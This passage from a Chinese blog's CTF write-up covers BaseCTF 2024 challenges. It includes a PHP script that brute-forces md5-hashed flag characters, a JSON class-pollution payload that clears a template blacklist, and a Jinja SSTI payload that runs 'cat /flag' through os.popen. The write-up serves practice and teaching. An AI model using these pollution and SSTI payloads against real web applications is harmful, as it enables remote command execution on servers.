class="hljs-variable">$tip</span></span>) </span>&#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$tip</span> != <span class="hljs-string">&quot;我要玩原神&quot;</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;我不管，我要玩原神！😭😭😭&quot;</span>);<br>  &#125;<br>  <span class="hljs-title function_ invoke__">dumpFlag</span>();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dumpFlag</span>(<span class="hljs-params"></span>) </span>&#123;<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;m&#x27;</span>]) || <span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;m&#x27;</span>]) != <span class="hljs-number">2</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;可恶的QQ人！😡😡😡&quot;</span>);<br>  &#125;<br>  <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;m&#x27;</span>][<span class="hljs-number">0</span>];<br>  <span class="hljs-variable">$b</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;m&#x27;</span>][<span class="hljs-number">1</span>];<br>  <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$a</span>) || <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$b</span>) || <span class="hljs-variable">$a</span> != <span class="hljs-string">&quot;100%&quot;</span> || <span class="hljs-variable">$b</span> != <span class="hljs-string">&quot;love100%&quot;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;某站崩了？肯定是某忽悠干的！😡😡😡&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br>  <span class="hljs-variable">$flag</span>[] = <span class="hljs-keyword">array</span>();<br>  <span class="hljs-keyword">for</span> (<span class="hljs-variable">$ii</span> = <span class="hljs-number">0</span>;<span class="hljs-variable">$ii</span> &lt; <span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$array</span>);<span class="hljs-variable">$ii</span>++) &#123;<br>    <span class="hljs-variable">$flag</span>[<span class="hljs-variable">$ii</span>] = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$array</span>[<span class="hljs-variable">$ii</span>]) ^ <span class="hljs-variable">$ii</span>);<br>  &#125;<br>  <br>  <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$flag</span>);<br>&#125; 错了！就你还想玩原神？❌❌❌<br></code></pre></td></tr></table></figure>
+
+给了一大串的源码，来瞅瞅
+
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">include <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-keyword">if</span> (sizeof(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;len&#x27;</span>]) == sizeof(<span class="hljs-variable">$array</span>)) &#123;<br>  ys_open(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;tip&#x27;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  die(<span class="hljs-string">&quot;错了！就你还想玩原神？❌❌❌&quot;</span>);<br>&#125;<span class="hljs-regexp">//</span>这是是要检查<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;len&#x27;</span>]数组的长度是否与<span class="hljs-variable">$array</span>数组的长度相同，然后就能调用这个函数继续走下去<br></code></pre></td></tr></table></figure>
+
+然后就是在ys_open里要满足$tip == "我要玩原神"
+
+再看到
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dumpFlag</span>(<span class="hljs-params"></span>) </span>&#123;<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;m&#x27;</span>]) || <span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;m&#x27;</span>]) != <span class="hljs-number">2</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;可恶的QQ人！😡😡😡&quot;</span>);<br>  &#125;<br>  <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;m&#x27;</span>][<span class="hljs-number">0</span>];<br>  <span class="hljs-variable">$b</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;m&#x27;</span>][<span class="hljs-number">1</span>];<br>  <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$a</span>) || <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$b</span>) || <span class="hljs-variable">$a</span> != <span class="hljs-string">&quot;100%&quot;</span> || <span class="hljs-variable">$b</span> != <span class="hljs-string">&quot;love100%&quot;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;某站崩了？肯定是某忽悠干的！😡😡😡&quot;</span>);<br>  &#125;<span class="hljs-comment">//主要就是这里$a == &quot;100%&quot;并且$b == &quot;love100%&quot; . md5($a)</span><br>  <br>&#125;<br></code></pre></td></tr></table></figure>
+
+我们构造
+
+![](http://xendria.icu/wp-content/uploads/2025/06/5545fa44c2333d3574baa0888dab8d5b-1024x624.png)
+
+然后问题就是这个了
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br>  <span class="hljs-variable">$flag</span>[] = <span class="hljs-keyword">array</span>();<br>  <span class="hljs-keyword">for</span> (<span class="hljs-variable">$ii</span> = <span class="hljs-number">0</span>;<span class="hljs-variable">$ii</span> &lt; <span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$array</span>);<span class="hljs-variable">$ii</span>++) &#123;<br>    <span class="hljs-variable">$flag</span>[<span class="hljs-variable">$ii</span>] = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$array</span>[<span class="hljs-variable">$ii</span>]) ^ <span class="hljs-variable">$ii</span>);<br>  &#125;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$flag</span>);<br></code></pre></td></tr></table></figure>
+
+需要我们通过逆向给的数据还原出flag，我们直接模仿他的操作然后匹配flag字符就好了
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php">贴个脚本<br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$md5</span> = [<span class="hljs-string">&quot;3295c76acbf4caaed33c36b1b5fc2cb1&quot;</span>,<span class="hljs-string">&quot;26657d5ff9020d2abefe558796b99584&quot;</span>,<span class="hljs-string">&quot;73278a4a86960eeb576a8fd4c9ec6997&quot;</span>,<span class="hljs-string">&quot;ec8956637a99787bd197eacd77acce5e&quot;</span>,<span class="hljs-string">&quot;e2c420d928d4bf8ce0ff2ec19b371514&quot;</span>,<span class="hljs-string">&quot;43ec517d68b6edd3015b3edc9a11367b&quot;</span>,<span class="hljs-string">&quot;ea5d2f1c4608232e07d3aa3d998e5135&quot;</span>,<span class="hljs-string">&quot;c8ffe9a587b126f152ed3d89a146b445&quot;</span>,<span class="hljs-string">&quot;a97da629b098b75c294dffdc3e463904&quot;</span>,<span class="hljs-string">&quot;03afdbd66e7929b125f8597834fa83a4&quot;</span>,<span class="hljs-string">&quot;a3c65c2974270fd093ee8a9bf8ae7d0b&quot;</span>,<span class="hljs-string">&quot;66f041e16a60928b05a7e228a89c3799&quot;</span>,<span class="hljs-string">&quot;f0935e4cd5920aa6c7c996a5ee53a70f&quot;</span>,<span class="hljs-string">&quot;698d51a19d8a121ce581499d7b701668&quot;</span>,<span class="hljs-string">&quot;9f61408e3afb633e50cdf1b20de6f466&quot;</span>,<span class="hljs-string">&quot;9f61408e3afb633e50cdf1b20de6f466&quot;</span>,<span class="hljs-string">&quot;7f39f8317fbdb1988ef4c628eba02591&quot;</span>,<span class="hljs-string">&quot;a5771bce93e200c36f7cd9dfd0e5deaa&quot;</span>,<span class="hljs-string">&quot;19ca14e7ea6328a42e0eb13d585e4c22&quot;</span>,<span class="hljs-string">&quot;d67d8ab4f4c10bf22aa353e27879133c&quot;</span>,<span class="hljs-string">&quot;a5771bce93e200c36f7cd9dfd0e5deaa&quot;</span>,<span class="hljs-string">&quot;9f61408e3afb633e50cdf1b20de6f466&quot;</span>,<span class="hljs-string">&quot;e369853df766fa44e1ed0ff613f563bd&quot;</span>,<span class="hljs-string">&quot;5ef059938ba799aaa845e1c2e8a762bd&quot;</span>,<span class="hljs-string">&quot;4c56ff4ce4aaf9573aa5dff913df997a&quot;</span>,<span class="hljs-string">&quot;6c8349cc7260ae62e3b1396831a8398f&quot;</span>,<span class="hljs-string">&quot;b53b3a3d6ab90ce0268229151c9bde11&quot;</span>,<span class="hljs-string">&quot;a0a080f42e6f13b3a2df133f073095dd&quot;</span>,<span class="hljs-string">&quot;67c6a1e7ce56d3d6fa748ab6d9af3fd7&quot;</span>,<span class="hljs-string">&quot;202cb962ac59075b964b07152d234b70&quot;</span>,<span class="hljs-string">&quot;a1d0c6e83f027327d8461063f4ac58a6&quot;</span>,<span class="hljs-string">&quot;c0c7c76d30bd3dcaefc96f40275bdc0a&quot;</span>,<span class="hljs-string">&quot;fc490ca45c00b1249bbe3554a4fdf6fb&quot;</span>,<span class="hljs-string">&quot;735b90b4568125ed6c3f678819b6e058&quot;</span>,<span class="hljs-string">&quot;98f13708210194c475687be6106a3b84&quot;</span>,<span class="hljs-string">&quot;b6d767d2f8ed5d21a44b0e5886680cb9&quot;</span>,<span class="hljs-string">&quot;c74d97b01eae257e44aa9d5bade97baf&quot;</span>,<span class="hljs-string">&quot;735b90b4568125ed6c3f678819b6e058&quot;</span>,<span class="hljs-string">&quot;c16a5320fa475530d9583c34fd356ef5&quot;</span>,<span class="hljs-string">&quot;a3f390d88e4c41f2747bfa2f1b5f87db&quot;</span>,<span class="hljs-string">&quot;c16a5320fa475530d9583c34fd356ef5&quot;</span>,<span class="hljs-string">&quot;1ff1de774005f8da13f42943881c655f&quot;</span>,<span class="hljs-string">&quot;6ea9ab1baa0efb9e19094440c317e21b&quot;</span>,<span class="hljs-string">&quot;4e732ced3463d06de0ca9a15b6153677&quot;</span>,<span class="hljs-string">&quot;43ec517d68b6edd3015b3edc9a11367b&quot;</span>];<br><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$md5</span>); <span class="hljs-variable">$i</span>++) &#123;<br>    <span class="hljs-variable">$found</span> = <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$j</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$j</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$j</span>++) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$j</span>)) ^ <span class="hljs-variable">$i</span>) === <span class="hljs-variable">$md5</span>[<span class="hljs-variable">$i</span>]) &#123;<br>            <span class="hljs-variable">$flag</span> .= <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$j</span>);<br>            <span class="hljs-variable">$found</span> = <span class="hljs-literal">true</span>;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$found</span>) &#123;<br>        <span class="hljs-variable">$flag</span> .= <span class="hljs-string">&#x27;?&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Flag: <span class="hljs-subst">$flag</span>\n&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+## Jinja Mark
+
+有两个路由一个/flag ，一个index。我们先看看![](http://xendria.icu/wp-content/uploads/2025/06/a1c3787b-6cc0-4c5d-abf0-3a283f45af79.png)![](http://xendria.icu/wp-content/uploads/2025/06/a63cba62-9367-45c1-9550-38c0eb74b065.png)
+
+![](http://xendria.icu/wp-content/uploads/2025/06/b9ffbf01-70e2-4c8d-b4e4-895108e58bb0.png)
+
+我们把lucky_number爆破出来获得部分源码
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python">你不会以为这里真的有flag吧？<br><br>想要flag的话先猜猜我的幸运数字<br><br>用POST方式把 lucky_number 告诉我吧，只有四位数哦<br><br>BLACKLIST_IN_index = [<span class="hljs-string">&#x27;&#123;&#x27;</span>,<span class="hljs-string">&#x27;&#125;&#x27;</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v, <span class="hljs-built_in">getattr</span>(dst, k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/magic&#x27;</span>,methods=[<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pollute</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <span class="hljs-keyword">if</span> request.is_json:<br>            merge(json.loads(request.data), instance)<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;这个魔术还行吧&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;我要json的魔术&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;记得用POST方法把魔术交上来&quot;</span><br></code></pre></td></tr></table></figure>
+
+emm，我们看到了过滤了{}，我们可以利用原型污染把这个全局变量BLACKLIST_IN_index = ['{','}']改了
+
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ada">&#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span> : &#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span> : &#123;<br>            <span class="hljs-string">&quot;BLACKLIST_IN_index&quot;</span> : []<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+![](http://xendria.icu/wp-content/uploads/2025/06/7a714105-739c-4a5f-8d5d-ae8ad014d318-1024x489.png)
+
+然后就能正常ssti了{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/wp/" class="category-chain-item">wp</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/wp/%E6%AF%94%E8%B5%9B/" class="category-chain-item">比赛</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%AF%94%E8%B5%9B/" class="print-no-link">#比赛</a>
+      
+        <a href="/tags/wp/" class="print-no-link">#wp</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>BaseCTF2024新生赛（复现部分</div>
+      <div>https://xendr1a.github.io/2025/09/02/BaseCTF2024新生赛复现部分/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Xendr1a</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年9月2日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/09/02/0xgame2024%E5%A4%8D%E7%8E%B0/" title="0xgame2024复现">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">0xgame2024复现</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/09/02/%E5%A4%8D%E7%8E%B0%20ctfshow%20%E6%AF%8F%E5%91%A8%E5%A4%A7%E6%8C%91%E6%88%98%E6%9E%81%E9%99%90%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="复现 ctfshow 每周大挑战(极限命令执行">
+                        <span class="hidden-mobile">复现 ctfshow 每周大挑战(极限命令执行</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    function isExpandAllEnabled() {
+      return CONFIG.toc && CONFIG.toc.expand_all === true;
+    }
+    function expandAllToc() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
+    }
+    function updateTocToggle($li, $childList) {
+      var $toggle = $li.children('.toc-toggle');
+      if ($toggle.length === 0) { return; }
+      var collapsed = $childList.hasClass('tocbot-is-collapsed');
+      $toggle
+        .toggleClass('toc-toggle-collapsed', collapsed)
+        .toggleClass('toc-toggle-expanded', !collapsed);
+    }
+    function bindTocToggle() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .toc-list-item').each(function() {
+        var $li = jQuery(this);
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) {
+          if ($li.children('.toc-toggle').length === 0) {
+            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
+          }
+          return;
+        }
+
+        if ($li.children('.toc-toggle').length === 0) {
+          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
+        }
+        updateTocToggle($li, $childList);
+      });
+      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var $li = jQuery(this).parent('.toc-list-item');
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) { return; }
+        $childList.toggleClass('tocbot-is-collapsed');
+        updateTocToggle($li, $childList);
+      });
+      if (!window.__tocToggleObserver) {
+        window.__tocToggleObserver = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
+            var $list = jQuery(mutation.target);
+            var $li = $list.parent('.toc-list-item');
+            if ($li.length === 0) { return; }
+            updateTocToggle($li, $list);
+          });
+        });
+        jQuery('#toc-body ol').each(function() {
+          window.__tocToggleObserver.observe(this, { attributes: true });
+        });
+      }
+    }
+    var tocConfig = Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc);
+    if (isExpandAllEnabled()) {
+      tocConfig.collapseDepth = 6;
+    }
+    window.tocbot.init(tocConfig);
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+    expandAllToc();
+    bindTocToggle();
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+        expandAllToc();
+        bindTocToggle();
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
